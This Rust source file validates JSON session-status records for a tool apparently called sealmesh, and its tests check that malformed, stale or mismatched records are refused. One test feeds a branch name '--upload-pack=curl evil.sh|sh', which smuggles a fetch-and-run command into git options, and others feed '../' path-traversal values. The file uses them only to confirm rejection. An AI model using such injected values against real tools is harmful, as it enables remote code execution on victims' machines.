use std::path::{Path, PathBuf};

use jiff::{SignedDuration, Timestamp};
use serde::Deserialize;

use crate::wire::{BranchName, JobId, RunState, TaskProgress};

use super::{
    Candidate,
    fs::{MAX_DIR_ENTRIES, is_path_segment, read_capped},
};

const MAX_RECORD_BYTES: u64 = 64 * 1024;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Rejection {
    Malformed,
    IdMismatch,
    RelativeWorktree,
    Stale,
    ParentGone,
    Unreadable,
}

impl std::fmt::Display for Rejection {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(match self {
            Self::Malformed => "malformed: unknown field, missing field, or a value out of range",
            Self::IdMismatch => "the filename and the record's own id disagree",
            Self::RelativeWorktree => "worktree is not an absolute path",
            Self::Stale => "stale: older than the declared ttl",
            Self::ParentGone => "its parent session is no longer running",
            Self::Unreadable => "unreadable, over the size cap, or not a regular file",
        })
    }
}

#[derive(Debug)]
pub struct Read {
    pub path: PathBuf,
    pub outcome: Result<Candidate, Rejection>,
}

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
struct Record {
    id: JobId,
    worktree: PathBuf,
    run_state: DeclaredState,
    started_at: Timestamp,
    updated_at: Timestamp,
    #[serde(default)]
    branch: Option<BranchName>,
    #[serde(default)]
    pr: Option<u32>,
    #[serde(default)]
    tasks: Option<TaskProgress>,
    #[serde(default)]
    parent: Option<ParentId>,
    /// What the writer says it is. Absent means the writer predates the field
    /// or did not care, and that reads as `declared` — not as `claude-code`,
    /// which would misattribute a wrapper around some other tool.
    #[serde(default)]
    tool: Option<crate::wire::ToolId>,
}

#[derive(Debug, Clone, Copy, Deserialize)]
#[serde(rename_all = "snake_case")]
enum DeclaredState {
    Working,
    Idle,
    NeedsInput,
    Done,
}

impl From<DeclaredState> for RunState {
    fn from(state: DeclaredState) -> Self {
        match state {
            DeclaredState::Working => Self::Working,
            DeclaredState::Idle => Self::Idle,
            DeclaredState::NeedsInput => Self::NeedsInput,
            DeclaredState::Done => Self::Done,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ParentId(String);

impl ParentId {
    pub fn as_str(&self) -> &str {
        &self.0
    }
}

impl TryFrom<String> for ParentId {
    type Error = &'static str;

    fn try_from(value: String) -> Result<Self, Self::Error> {
        if is_path_segment(&value) {
            Ok(Self(value))
        } else {
            Err("parent must be 1-64 chars of [A-Za-z0-9_-]")
        }
    }
}

impl<'de> Deserialize<'de> for ParentId {
    fn deserialize<D: serde::Deserializer<'de>>(d: D) -> Result<Self, D::Error> {
        Self::try_from(String::deserialize(d)?).map_err(serde::de::Error::custom)
    }
}

/// Sessions some provider vouched for. Matched on the id alone, deliberately:
/// a writer knows the session id it was handed but not necessarily what
/// sealmesh calls the tool that handed it over, and requiring both would make
/// `--parent` unusable across a tool boundary — which is the case it exists for.
pub struct LiveSessions<'a>(pub &'a std::collections::BTreeSet<String>);

impl LiveSessions<'_> {
    fn has(&self, parent: &ParentId) -> bool {
        self.0.contains(parent.as_str())
    }
}

pub fn read_all(dir: &Path, ttl: SignedDuration, now: Timestamp, live: &LiveSessions) -> Vec<Read> {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return Vec::new();
    };
    let mut records: Vec<Read> = entries
        .flatten()
        .take(MAX_DIR_ENTRIES)
        .filter(|entry| entry.path().extension().is_some_and(|e| e == "json"))
        .map(|entry| {
            let path = entry.path();
            let outcome = read_one(&path, ttl, now, live);
            Read { path, outcome }
        })
        .collect();
    records.sort_by(|a, b| a.path.cmp(&b.path));
    records
}

fn read_one(
    path: &Path,
    ttl: SignedDuration,
    now: Timestamp,
    live: &LiveSessions,
) -> Result<Candidate, Rejection> {
    let bytes = read_capped(path, MAX_RECORD_BYTES).ok_or(Rejection::Unreadable)?;
    let record: Record = serde_json::from_slice(&bytes).map_err(|_| Rejection::Malformed)?;

    let stem = path
        .file_stem()
        .and_then(|s| s.to_str())
        .ok_or(Rejection::IdMismatch)?;
    if stem != record.id.as_str() {
        return Err(Rejection::IdMismatch);
    }

    if !record.worktree.is_absolute() {
        return Err(Rejection::RelativeWorktree);
    }

    match &record.parent {
        Some(parent) if live.has(parent) => {}
        Some(_) => return Err(Rejection::ParentGone),
        None => {
            if now.duration_since(record.updated_at) > ttl {
                return Err(Rejection::Stale);
            }
        }
    }

    Ok(Candidate {
        id: record.id,
        tool: record.tool.unwrap_or_else(crate::wire::ToolId::declared),
        work_dir: record.worktree,
        session_id: None,
        children: Vec::new(),
        run_state: record.run_state.into(),
        started_at: record.started_at,
        updated_at: record.updated_at,
        declared_branch: record.branch,
        declared_pr: record.pr,
        tasks_hint: record.tasks,
    })
}

#[cfg(test)]
mod tests {
    #![allow(
        clippy::unwrap_used,
        clippy::expect_used,
        clippy::panic,
        clippy::indexing_slicing
    )]

    use super::*;

    const NOW: &str = "2026-08-24T12:00:00Z";

    fn now() -> Timestamp {
        NOW.parse().unwrap()
    }

    fn ttl() -> SignedDuration {
        SignedDuration::from_secs(900)
    }

    static NO_SESSIONS: std::sync::LazyLock<std::collections::BTreeSet<String>> =
        std::sync::LazyLock::new(std::collections::BTreeSet::new);

    fn none() -> LiveSessions<'static> {
        LiveSessions(&NO_SESSIONS)
    }

    struct Dir(PathBuf);

    impl Dir {
        fn new(name: &str) -> Self {
            let dir = std::env::temp_dir().join(format!("sealmesh-declared-{name}"));
            std::fs::remove_dir_all(&dir).ok();
            std::fs::create_dir_all(&dir).unwrap();
            Self(dir)
        }

        fn write(&self, name: &str, json: &serde_json::Value) {
            std::fs::write(self.0.join(name), json.to_string()).unwrap();
        }
    }

    impl Drop for Dir {
        fn drop(&mut self) {
            std::fs::remove_dir_all(&self.0).ok();
        }
    }

    fn full() -> serde_json::Value {
        serde_json::json!({
            "id": "1a2b3c4d",
            "worktree": "/Users/dart/work/checkout-service",
            "run_state": "working",
            "started_at": "2026-08-24T11:41:03.591Z",
            "updated_at": "2026-08-24T11:55:19.004Z",
            "branch": "feature/ABC-412-retry-budget",
            "pr": 627,
            "tasks": { "completed": 3, "total": 8 },
            "parent": "a04e3d0f-d94b-4d7e-9f02-5b09827a67f9"
        })
    }

    fn minimal() -> serde_json::Value {
        serde_json::json!({
            "id": "1a2b3c4d",
            "worktree": "/Users/dart/work/checkout-service",
            "run_state": "working",
            "started_at": "2026-08-24T11:41:03.591Z",
            "updated_at": "2026-08-24T11:55:19.004Z"
        })
    }

    fn one(dir: &Dir) -> Result<Candidate, Rejection> {
        let mut reads = read_all(&dir.0, ttl(), now(), &none());
        assert_eq!(reads.len(), 1, "{reads:#?}");
        reads.remove(0).outcome
    }

    #[test]
    fn the_documented_minimal_record_parses() {
        let dir = Dir::new("minimal");
        dir.write("1a2b3c4d.json", &minimal());

        let candidate = one(&dir).unwrap();
        assert_eq!(candidate.id.as_str(), "1a2b3c4d");
        assert_eq!(candidate.run_state, RunState::Working);
        assert_eq!(candidate.declared_pr, None);
        assert_eq!(candidate.tasks_hint, None);
    }

    #[test]
    fn the_documented_full_record_parses() {
        let dir = Dir::new("full");
        dir.write("1a2b3c4d.json", &full());

        let live = ["a04e3d0f-d94b-4d7e-9f02-5b09827a67f9".to_owned()];
        let live: std::collections::BTreeSet<String> = live.into_iter().collect();
        let mut reads = read_all(&dir.0, ttl(), now(), &LiveSessions(&live));
        let candidate = reads.remove(0).outcome.unwrap();

        assert_eq!(
            candidate.declared_branch.as_ref().map(BranchName::as_str),
            Some("feature/ABC-412-retry-budget")
        );
        assert_eq!(candidate.declared_pr, Some(627));
        assert_eq!(candidate.tasks_hint, Some(TaskProgress::new(3, 8).unwrap()));
        assert_eq!(candidate.run_state, RunState::Working);
    }

    #[test]
    fn an_unknown_field_refuses_the_whole_record() {
        let dir = Dir::new("unknown");
        let mut json = minimal();
        json["note"] = serde_json::json!("a sentence someone typed");
        dir.write("1a2b3c4d.json", &json);

        assert_eq!(one(&dir).unwrap_err(), Rejection::Malformed);
    }

    #[test]
    fn a_writer_cannot_declare_an_unknown_run_state() {
        let dir = Dir::new("unknownstate");
        for state in ["unknown", "error", "busy", "Working"] {
            let mut json = minimal();
            json["run_state"] = serde_json::json!(state);
            dir.write("1a2b3c4d.json", &json);
            assert_eq!(
                one(&dir).unwrap_err(),
                Rejection::Malformed,
                "accepted {state:?}"
            );
        }
    }

    #[test]
    fn values_that_fail_their_wire_type_refuse_the_record() {
        let dir = Dir::new("badvalues");
        for (field, value) in [
            ("id", serde_json::json!("ZZZZZZZZ")),
            ("branch", serde_json::json!("--upload-pack=curl evil.sh|sh")),
            ("tasks", serde_json::json!({"completed": 0, "total": 0})),
            ("tasks", serde_json::json!({"completed": 9, "total": 3})),
            ("parent", serde_json::json!("../../../../etc")),
        ] {
            let mut json = minimal();
            json[field] = value.clone();
            let name = if field == "id" {
                "ZZZZZZZZ.json"
            } else {
                "1a2b3c4d.json"
            };
            std::fs::remove_file(dir.0.join("1a2b3c4d.json")).ok();
            std::fs::remove_file(dir.0.join("ZZZZZZZZ.json")).ok();
            dir.write(name, &json);
            assert_eq!(
                one(&dir).unwrap_err(),
                Rejection::Malformed,
                "accepted {field} = {value}"
            );
        }
    }

    #[test]
    fn a_filename_that_disagrees_with_the_id_is_refused() {
        let dir = Dir::new("mismatch");
        dir.write("deadbeef.json", &minimal());

        assert_eq!(one(&dir).unwrap_err(), Rejection::IdMismatch);
    }

    #[test]
    fn a_relative_worktree_is_refused() {
        let dir = Dir::new("relative");
        let mut json = minimal();
        json["worktree"] = serde_json::json!("../../etc");
        dir.write("1a2b3c4d.json", &json);

        assert_eq!(one(&dir).unwrap_err(), Rejection::RelativeWorktree);
    }

    #[test]
    fn a_record_past_its_ttl_is_stale_not_a_row() {
        let dir = Dir::new("stale");
        let mut json = minimal();
        json["updated_at"] = serde_json::json!("2026-08-24T11:00:00Z");
        dir.write("1a2b3c4d.json", &json);

        assert_eq!(one(&dir).unwrap_err(), Rejection::Stale);
    }

    #[test]
    fn a_record_from_the_future_does_not_panic_or_go_stale() {
        let dir = Dir::new("future");
        let mut json = minimal();
        json["updated_at"] = serde_json::json!("2027-01-01T00:00:00Z");
        dir.write("1a2b3c4d.json", &json);

        assert!(one(&dir).is_ok());
    }

    #[test]
    fn a_live_parent_governs_instead_of_the_ttl() {
        let dir = Dir::new("parent");
        let mut json = minimal();
        json["parent"] = serde_json::json!("a04e3d0f");
        json["updated_at"] = serde_json::json!("2026-08-24T10:00:00Z");
        dir.write("1a2b3c4d.json", &json);

        let live = std::collections::BTreeSet::from(["a04e3d0f".to_owned()]);
        let mut reads = read_all(&dir.0, ttl(), now(), &LiveSessions(&live));
        assert!(
            reads.remove(0).outcome.is_ok(),
            "a live parent did not beat the ttl"
        );

        assert_eq!(one(&dir).unwrap_err(), Rejection::ParentGone);
    }

    #[test]
    fn a_writers_temp_file_is_not_read() {
        let dir = Dir::new("tmp");
        dir.write("1a2b3c4d.json", &minimal());
        std::fs::write(dir.0.join(".1a2b3c4d.json.tmp.4242"), "{\"id\":").unwrap();

        let reads = read_all(&dir.0, ttl(), now(), &none());
        assert_eq!(reads.len(), 1, "{reads:#?}");
        assert!(reads.first().unwrap().outcome.is_ok());
    }

    #[test]
    fn one_bad_record_is_contained_to_its_own_row() {
        let dir = Dir::new("contained");
        dir.write("1a2b3c4d.json", &minimal());
        std::fs::write(dir.0.join("bbbbbbbb.json"), "not json at all").unwrap();

        let reads = read_all(&dir.0, ttl(), now(), &none());
        assert_eq!(reads.len(), 2);
        assert_eq!(reads.iter().filter(|r| r.outcome.is_ok()).count(), 1);
    }

    #[test]
    fn a_missing_directory_reads_as_no_records() {
        let missing = std::env::temp_dir().join("sealmesh-declared-does-not-exist");
        std::fs::remove_dir_all(&missing).ok();
        assert!(read_all(&missing, ttl(), now(), &none()).is_empty());
    }

    #[test]
    fn a_rejection_never_echoes_the_records_contents() {
        let dir = Dir::new("noecho");
        let mut json = minimal();
        json["note"] = serde_json::json!("PASTED-SLACK-THREAD-NAMING-A-THIRD-PARTY");
        dir.write("1a2b3c4d.json", &json);

        let outcome = one(&dir).unwrap_err();
        let rendered = format!("{outcome} {outcome:?}");
        assert!(!rendered.contains("PASTED"), "{rendered}");
        assert!(!rendered.contains("note"), "{rendered}");
    }

    #[test]
    fn the_cap_is_far_above_a_conforming_record() {
        const { assert!(MAX_RECORD_BYTES >= 8 * 1024) };
    }
}
